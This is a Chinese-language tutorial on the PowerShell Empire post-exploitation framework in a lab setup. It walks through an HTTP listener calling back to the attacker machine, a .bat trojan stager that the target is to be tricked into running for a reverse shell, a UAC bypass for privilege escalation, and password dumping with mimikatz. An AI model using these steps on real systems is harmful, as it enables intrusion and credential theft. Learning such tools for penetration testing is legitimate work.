# 简介

        Empire官方是一个纯粹的PowerShell研发代理建立在密码安全的通信和灵活的架构。Empire实现了无嚅powershell.exe即可运行PowerShell代理的功能,从键盘记录器到Mimikatz等快速部署的后期开发模块,以及适应性通信以逃避网络检测，所有这些都包含在以可用性为中心的框架中。它在2015年在BSidesLV亮相。

        官方链接：http://powershellempire.com/

  

# 安装

        Empire运行在Linux平台上,不要试图使用centos环境,,建议使用Debian或Ubuntu,以及kali Linux系统,我使用的是系统是kali Linux系统

下载安装

```
git clone https://github.com/EmpireProject/Empire.git
cd /Empire/setup
sudo ./install.sh
进入Empire目录./empire 打开Empire
输入help查看帮助
```

# 实战

攻击机kali：192.168.1.10

目标机win7：192.168.1.23

## 创建一个监听并查看需要的配置

        输入 listeners 命令进入监听模块，进入后需要使用监听种类，输入 uselistener 加空格然后两下 tab 可列出所有的可使用监听类，这里我们使用 http，随后输入 info 可查看此类监听的详细信息

*   
*   
*   

```
(Empire) > listeners(Empire: listeners) > uselistener http(Empire: listeners/http) > info
```

![](../Images/b8a0ba3cfacb47f20f1056be8f90e47b.png)

  

        这里需要设置下 name 参数，随意定义一个名字，例如 XMTX，然后另外还要注意下 host 参数和 port，即监听使用的 IP 和端口，设置无误后，通过 execute 执行

*   
*   
*   
*   

```
(Empire: listeners/http) > set Name XMTX(Empire: listeners/http) > set Port 4444(Empire: listeners/http) > set Host 192.168.1.10:4444(Empire: listeners/http) > execute
```

![](../Images/1b28e9e7b3cb69557351bd85cf2c9ab4.png)

  

## 创建木马

        设置好监听后通过 back 命令返回上一级，然后使用 usestager 命令来指定生成木马的类型这里我们使用 windows/launcher\_bat，即 windows 平台下的 bat 文件，使用info 查看此模块的详细信息

*   
*   
*   

```
(Empire: listeners/http) > back(Empire: listeners) > usestager windows/launcher_bat(Empire: stager/windows/launcher_bat) > info
```

![](../Images/2934cc3774f51e0c7851cc639d90fe34.png)

  

        生成的文件类型大体有三类，multi 开头的是通用类，osx 开头即 mac 使用，windows 即 win 平台使用。使用 launcher\_bat 模块后，通过 info 我们看到了参数信息，这里需要设置一个 Listener 参数，即监听的名字，就是我们刚才的 XMTX，设置后通过 execute 执行

*   
*   

```
(Empire: stager/windows/launcher_bat) > set Listener XMTX(Empire: stager/windows/launcher_bat) > execute
```

![](../Images/40c041593ac2720bd3cc18abffd71966.png)

  

        诱导目标机运行生成的文件，成功反弹shell，通过 agents 就可查看目前得到的 shell，使用interact 加 name 命令即可进入 shell 中

![](../Images/cb4d6861f257c1add934da7d897f9b3e.png)

  

## 提权

        执行 windows 系统自带的命令，可以通过 shell 加命令的格式，例如查看当前 shell 的权限，我们输入 shell whoami /groups，返回了 medium 即非高权限

![](../Images/2253e98c589c509967c773cd0170c044.png)

  

        empire 提供了很多使用模块，这里我们通过 usemodule 空格加两下 tab 可查看全部模块，有三百多个

![](../Images/abb17f71491e6ece3423a85b493c2ba5.png)

  

        bypassuac 提权我们使用 usemodule privesc/bypassuac 这个模块，然后 info 查看其信息

*   
*   

```
(Empire: GE8N4W53) > usemodule privesc/bypassuac(Empire: powershell/privesc/bypassuac) > info
```

![](../Images/53dcb39f943fa169e7ac7dd030d0b98a.png)

  

        需要设置的参数还是 Listener，即监听的名称，这里是 XMTX

*   
*   

```
(Empire: powershell/privesc/bypassuac) > set Listener XMTX(Empire: powershell/privesc/bypassuac) > execute
```

![](../Images/ba6f856e45f58e2ca7196f9c4f73305b.png)

  

        成功后会返回一个新的 shell，随后我们通过 agents 查看已有的 shell

![](../Images/87bbfe52f2a933d3c115bf5f35309aea.png)

  

进入高权限的shell，使用mimikatz

*   
*   

```
(Empire: agents) > interact RPBEM1CY(Empire: RPBEM1CY) > mimikatz
```

![](../Images/9f7273493168c220b39deee511bc5ac9.png)

        通过 mimikatz 获取后，若在内网机器较多，为了查看方便，我们可以通过 creds 命令来直接列出其密码

![](../Images/8305713a161ea86698c526426086f32e.png)
